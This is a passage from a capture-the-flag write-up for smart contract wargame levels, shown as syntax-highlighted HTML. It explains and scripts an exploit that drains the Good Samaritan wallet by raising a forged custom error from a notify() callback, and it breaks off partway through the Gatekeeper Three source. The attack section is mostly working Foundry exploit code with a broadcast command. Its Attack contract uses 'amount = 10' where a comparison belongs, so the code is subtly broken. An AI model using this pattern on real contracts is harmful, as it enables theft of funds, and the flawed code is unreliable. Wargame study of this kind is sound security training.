</span>
<span>    </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">onlyOwner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">!=</span><span> owner</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">revert</span><span> </span><span class="token" style="color:#dcdcaa">OnlyOwner</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        owner </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">donate10</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> dest_</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">// check balance left</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>coin</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balances</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">&lt;</span><span> </span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">revert</span><span> </span><span class="token" style="color:#dcdcaa">NotEnoughBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span> </span><span class="token" style="color:#569CD6">else</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#6a9955">// donate 10 coins</span><span>
</span><span>            coin</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>dest_</span><span class="token" style="color:#d4d4d4">,</span><span> </span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">transferRemainder</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> dest_</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#6a9955">// transfer balance left</span><span>
</span><span>        coin</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">transfer</span><span class="token" style="color:#d4d4d4">(</span><span>dest_</span><span class="token" style="color:#d4d4d4">,</span><span> coin</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balances</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">setCoin</span><span class="token" style="color:#d4d4d4">(</span><span>Coin coin_</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> onlyOwner </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        coin </span><span class="token" style="color:#d4d4d4">=</span><span> coin_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">interface</span><span> </span><span class="token" style="color:#4ec9b0">INotifyable</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">notify</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span></code></div></pre>
<p><strong>Goal:</strong></p>
<p>Would you be able to drain all the balance from his Wallet?</p>
<p><strong>Explanation:</strong></p>
<ol>
<li>There in total three contract are given to us. <code>GoodSamaritan</code> contract deployes <code>Wallet</code> and <code>Coin</code> contracts.</li>
<li>Good samaritan will be the <code>owner</code> of the <code>Wallet</code> contract. And the wallet contract will have 10**6 Coin balances.</li>
<li>We are given with the GoodSamaritan instance address. We can able to call the <code>requestDonation()</code> function to get 10 coins from the GoodSamaritan’s Wallet.</li>
<li>One call to <code>requestDonation()</code> will get 10 coins only. To drain all the coins of the Wallet we need to call the <code>requestDonation()</code> function <code>100000</code> times which requires more gas.</li>
<li>Instead we can try to invoke the <code>withdrawRemainder()</code> function which will send all the coins at a time.</li>
<li>The <code>withdrawRemainder()</code> is called when the <code>wallet.donate10(msg.sender)</code> returns error <code>NotEnoughBalance()</code> defined inside Wallet contract.</li>
<li>GoodSamaritan contract expects the error from the Wallet contract only. But as per the solidity docs, the error may be raised and bubbled up by any intermediary contract. That means we cannot predict the origin of the error.</li>
<li>So, can we raise error by ourself to the GoodSamaritan..? yes, When transfering 10 coins to the sender inside the <code>Coin</code> contract it notifies the sender if the sender is a contract.</li>
<li>This means it calls to our <code>msg.sender</code>, now we can implement the <code>notify()</code> function inside our Attack contract and revert with the <code>NotEnoughBalance()</code> error when receiving the 10 coins.</li>
<li>We should revert the <code>NotEnoughBalance()</code> error when only receiving the 10 coins not when the GoodSamaritan sending whole coins.</li>
<li>For this I used the amount parameter sent by the Coin contract through the notify call.</li>
<li>Now GoodSamaritan gets the error <code>NotEnoughBalance()</code> when it sends 10 coins to us, immediately it will send whole coins to us.</li>
</ol>
<p><strong>Level27Solution.s.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/Script.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;forge-std/console.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">import</span><span> </span><span class="token" style="color:#ce9178">&quot;../src/Level27.sol&quot;</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Level27Sol</span><span> </span><span class="token" style="color:#569CD6">is</span><span> Script </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    GoodSamaritan </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">GoodSamaritan</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x99A5FD376b27d513922E7b0bc36DbBb1941b31F6</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">run</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">startBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span>vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">envUint</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">&quot;PRIVATE_KEY&quot;</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">&quot;Balance of Wallet before attack&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>            instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">coin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balances</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">wallet</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        console</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">log</span><span class="token" style="color:#d4d4d4">(</span><span>
</span><span>            </span><span class="token" style="color:#ce9178">&quot;Balance of Wallet after attack&quot;</span><span class="token" style="color:#d4d4d4">,</span><span>
</span><span>            instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">coin</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">balances</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span>instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">wallet</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>        vm</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">stopBroadcast</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">Attack</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    error </span><span class="token" style="color:#dcdcaa">NotEnoughBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    GoodSamaritan </span><span class="token" style="color:#569CD6">public</span><span> instance </span><span class="token" style="color:#d4d4d4">=</span><span>
</span><span>        </span><span class="token" style="color:#dcdcaa">GoodSamaritan</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0x99A5FD376b27d513922E7b0bc36DbBb1941b31F6</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">exploit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        instance</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">requestDonation</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">notify</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span> amount</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">external</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>amount </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#b5cea8">10</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#6a9955">// only revert when receiving 10 coins</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">revert</span><span> </span><span class="token" style="color:#dcdcaa">NotEnoughBalance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span></code></div></pre>
<p><strong>To run the script</strong></p>
<pre><code>$ source .env
$ forge script script/Level27Solution.s.sol:Level27Sol --rpc-url $RPC_URL --broadcast
</code></pre>
<h2>Gatekeeper Three</h2>
<p><strong>Level28.sol</strong></p>
<pre><div style="color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto;background:#1e1e1e"><code class="language-solidity" style="white-space:pre;color:#d4d4d4;font-size:13px;text-shadow:none;font-family:Menlo, Monaco, Consolas, &quot;Andale Mono&quot;, &quot;Ubuntu Mono&quot;, &quot;Courier New&quot;, monospace;direction:ltr;text-align:left;word-spacing:normal;word-break:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="token" style="color:#6a9955">// SPDX-License-Identifier: MIT</span><span>
</span><span></span><span class="token" style="color:#569CD6">pragma</span><span> </span><span class="token" style="color:#569CD6">solidity</span><span> </span><span class="token" style="color:#d4d4d4">^</span><span class="token version" style="color:#b5cea8">0.8.0</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">SimpleTrick</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    GatekeeperThree </span><span class="token" style="color:#569CD6">public</span><span> target</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> trick</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">uint256</span><span> </span><span class="token" style="color:#569CD6">private</span><span> password </span><span class="token" style="color:#d4d4d4">=</span><span> block</span><span class="token" style="color:#d4d4d4">.</span><span>timestamp</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">constructor</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">payable</span><span> _target</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        target </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#dcdcaa">GatekeeperThree</span><span class="token" style="color:#d4d4d4">(</span><span>_target</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">checkPassword</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span> _password</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#569CD6">returns</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">bool</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>_password </span><span class="token" style="color:#d4d4d4">==</span><span> password</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>        password </span><span class="token" style="color:#d4d4d4">=</span><span> block</span><span class="token" style="color:#d4d4d4">.</span><span>timestamp</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">return</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">trickInit</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        trick </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">trickyTrick</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">&amp;&amp;</span><span> </span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">!=</span><span> trick</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            target</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">getAllowance</span><span class="token" style="color:#d4d4d4">(</span><span>password</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span></span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span></span><span class="token" style="color:#569CD6">contract</span><span> </span><span class="token" style="color:#4ec9b0">GatekeeperThree</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> owner</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">address</span><span> </span><span class="token" style="color:#569CD6">public</span><span> entrant</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#ce9178">bool</span><span> </span><span class="token" style="color:#569CD6">public</span><span> allowEntrance</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    SimpleTrick </span><span class="token" style="color:#569CD6">public</span><span> trick</span><span class="token" style="color:#d4d4d4">;</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">construct0r</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        owner </span><span class="token" style="color:#d4d4d4">=</span><span> msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">gateOne</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>msg</span><span class="token" style="color:#d4d4d4">.</span><span>sender </span><span class="token" style="color:#d4d4d4">==</span><span> owner</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>tx</span><span class="token" style="color:#d4d4d4">.</span><span>origin </span><span class="token" style="color:#d4d4d4">!=</span><span> owner</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">gateTwo</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">require</span><span class="token" style="color:#d4d4d4">(</span><span>allowEntrance </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">modifier</span><span> </span><span class="token" style="color:#dcdcaa">gateThree</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span>balance </span><span class="token" style="color:#d4d4d4">&gt;</span><span> </span><span class="token" style="color:#b5cea8">0.001</span><span> ether </span><span class="token" style="color:#d4d4d4">&amp;&amp;</span><span> </span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span>owner</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">send</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#b5cea8">0.001</span><span> ether</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">==</span><span> </span><span class="token" style="color:#569cd6">false</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            </span><span class="token" style="color:#569CD6">_</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">getAllowance</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">uint256</span><span> _password</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        </span><span class="token" style="color:#569CD6">if</span><span> </span><span class="token" style="color:#d4d4d4">(</span><span>trick</span><span class="token" style="color:#d4d4d4">.</span><span class="token" style="color:#dcdcaa">checkPassword</span><span class="token" style="color:#d4d4d4">(</span><span>_password</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>            allowEntrance </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569cd6">true</span><span class="token" style="color:#d4d4d4">;</span><span>
</span><span>        </span><span class="token" style="color:#d4d4d4">}</span><span>
</span><span>    </span><span class="token" style="color:#d4d4d4">}</span><span>
</span>
<span>    </span><span class="token" style="color:#569CD6">function</span><span> </span><span class="token" style="color:#dcdcaa">createTrick</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#d4d4d4">)</span><span> </span><span class="token" style="color:#569CD6">public</span><span> </span><span class="token" style="color:#d4d4d4">{</span><span>
</span><span>        trick </span><span class="token" style="color:#d4d4d4">=</span><span> </span><span class="token" style="color:#569CD6">new</span><span> </span><span class="token" style="color:#4ec9b0">SimpleTrick</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">payable</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#ce9178">address</span><span class="token" style="color:#d4d4d4">(</span><span class="token" style="color:#569CD6">this</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">)</span><span class="token" style="color:#d4d4d4">;</span><span>
